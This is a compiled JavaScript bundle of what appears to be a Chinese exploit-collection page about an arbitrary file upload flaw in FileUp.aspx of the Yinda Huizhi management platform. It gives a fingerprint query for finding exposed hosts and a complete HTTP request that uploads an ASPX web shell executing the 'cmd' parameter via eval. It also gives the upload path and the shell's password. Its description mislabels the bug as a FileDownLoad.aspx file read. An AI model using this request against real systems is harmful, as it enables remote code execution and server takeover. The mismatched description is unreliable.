{"code":"(window.webpackJsonp=window.webpackJsonp||[]).push([[170],{1529:function(a,t,s){a.exports=s.p+\"assets/img/1627914977251-450973a6-e847-454b-817b-efa35fdc4aed.72080f3d.png\"},1530:function(a,t,s){a.exports=s.p+\"assets/img/1629368451848-7ecbcd3e-82cc-4608-b9a9-a312826248ea.5453e485.png\"},1531:function(a,t,s){a.exports=s.p+\"assets/img/1629368525052-fffda86a-30fa-4dc0-a3a0-537a0be5b5c3.e3e58eb8.png\"},2067:function(a,t,s){\"use strict\";s.r(t);var e=s(56),n=Object(e.a)({},(function(){var a=this,t=a.$createElement,e=a._self._c||t;return e(\"ContentSlotsDistributor\",{attrs:{\"slot-key\":a.$parent.slotKey}},[e(\"h1\",{attrs:{id:\"银达汇智-智慧综合管理平台-fileup-aspx-任意文件上传漏洞\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#银达汇智-智慧综合管理平台-fileup-aspx-任意文件上传漏洞\"}},[a._v(\"#\")]),a._v(\" 银达汇智 智慧综合管理平台 FileUp.aspx 任意文件上传漏洞\")]),a._v(\" \"),e(\"h2\",{attrs:{id:\"漏洞描述\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞描述\"}},[a._v(\"#\")]),a._v(\" 漏洞描述\")]),a._v(\" \"),e(\"p\",[a._v(\"银达汇智 智慧综合管理平台 FileDownLoad.aspx 存在任意文件读取漏洞，通过漏洞攻击者可下载服务器中的任意文件\")]),a._v(\" \"),e(\"h2\",{attrs:{id:\"漏洞影响\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞影响\"}},[a._v(\"#\")]),a._v(\" 漏洞影响\")]),a._v(\" \"),e(\"a-checkbox\",{attrs:{checked:\"\"}},[a._v(\"银达汇智 智慧综合管理平台 \")]),e(\"br\"),a._v(\" \"),e(\"h2\",{attrs:{id:\"网络测绘\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#网络测绘\"}},[a._v(\"#\")]),a._v(\" 网络测绘\")]),a._v(\" \"),e(\"a-checkbox\",{attrs:{checked:\"\"}},[a._v('\"汇智信息\" && title==\"智慧综合管理平台登入\"')]),e(\"br\"),a._v(\" \"),e(\"h2\",{attrs:{id:\"漏洞复现\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞复现\"}},[a._v(\"#\")]),a._v(\" 漏洞复现\")]),a._v(\" \"),e(\"p\",[a._v(\"登陆页面\")]),a._v(\" \"),e(\"p\",[e(\"img\",{attrs:{src:s(1529),alt:\"img\"}})]),a._v(\" \"),e(\"p\",[a._v(\"文件上传请求包\")]),a._v(\" \"),e(\"div\",{staticClass:\"language-bash extra-class\"},[e(\"pre\",{pre:!0,attrs:{class:\"language-bash\"}},[e(\"code\",[a._v(\"POST /Module/FileUpPage/FileUp.aspx?orgid\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\"=\")]),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[a._v(\"1\")]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\"&\")]),e(\"span\",{pre:!0,attrs:{class:\"token assign-left variable\"}},[a._v(\"type\")]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\"=\")]),a._v(\"NNewsContent HTTP/1.1\\nHost: \\nAccept-Encoding: identity\\nContent-Length: \"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[a._v(\"337\")]),a._v(\"\\nAccept-Language: zh-CN,zh\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\";\")]),e(\"span\",{pre:!0,attrs:{class:\"token assign-left variable\"}},[a._v(\"q\")]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\"=\")]),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[a._v(\"0.8\")]),a._v(\"\\nAccept: */*\\nUser-Agent: Mozilla/5.0 \"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\"(\")]),a._v(\"Windows NT \"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[a._v(\"5.1\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\";\")]),a._v(\" rv:5.0\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\")\")]),a._v(\" Gecko/20100101 Firefox/5.0\\nAccept-Charset: GBK,utf-8\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\";\")]),e(\"span\",{pre:!0,attrs:{class:\"token assign-left variable\"}},[a._v(\"q\")]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\"=\")]),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[a._v(\"0.7\")]),a._v(\",*\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\";\")]),e(\"span\",{pre:!0,attrs:{class:\"token assign-left variable\"}},[a._v(\"q\")]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\"=\")]),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[a._v(\"0.3\")]),a._v(\"\\nConnection: keep-alive\\nReferer: http://www.baidu.com\\nCache-Control: max-age\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\"=\")]),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[a._v(\"0\")]),a._v(\"\\nContent-Type: multipart/form-data\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\";\")]),a._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token assign-left variable\"}},[a._v(\"boundary\")]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\"=\")]),a._v(\"62907949903a4c499178971c9dab4ad9\\n\\n--62907949903a4c499178971c9dab4ad9\\nContent-Disposition: form-data\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\";\")]),a._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token assign-left variable\"}},[a._v(\"name\")]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\"=\")]),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[a._v('\"Filedata\"')]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\";\")]),a._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token assign-left variable\"}},[a._v(\"filename\")]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\"=\")]),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[a._v('\"abc.aspx\"')]),a._v(\"\\nContent-Type: image/jpeg\\n\\n\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\"<\")]),a._v(\"%@ Page \"),e(\"span\",{pre:!0,attrs:{class:\"token assign-left variable\"}},[a._v(\"Language\")]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\"=\")]),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[a._v('\"Jscript\"')]),a._v(\"%\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\">\")]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\"<\")]),a._v(\"%Response.Write\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\"(\")]),a._v(\"FormsAuthentication.HashPasswordForStoringInConfigFile\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\"(\")]),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[a._v('\"abc\"')]),a._v(\", \"),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[a._v('\"MD5\"')]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\")\")]),a._v(\".ToLower\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\"(\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\"))\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\";\")]),a._v(\"eval\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\"(\")]),a._v(\"Request.Item\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\"[\")]),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[a._v('\"cmd\"')]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\"]\")]),a._v(\",\"),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[a._v('\"unsafe\"')]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\")\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\";\")]),a._v(\"%\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\">\")]),a._v(\"\\n--62907949903a4c499178971c9dab4ad9--\\n\")])])]),e(\"p\",[e(\"img\",{attrs:{src:s(1530),alt:\"img\"}})]),a._v(\" \"),e(\"p\",[a._v(\"响应包会返回文件名，上传的目录为\")]),a._v(\" \"),e(\"div\",{staticClass:\"language-bash extra-class\"},[e(\"pre\",{pre:!0,attrs:{class:\"language-bash\"}},[e(\"code\",[a._v(\"/imgnews/imgcontent/1/xxxxxxxxxx.aspx\\n\")])])]),e(\"p\",[e(\"img\",{attrs:{src:s(1531),alt:\"img\"}})]),a._v(\" \"),e(\"p\",[a._v(\"出现如图成功上传木马，密码为 \"),e(\"strong\",[a._v(\"cmd\")])])],1)}),[],!1,null,null,null);t.default=n.exports}}]);","extractedComments":[]}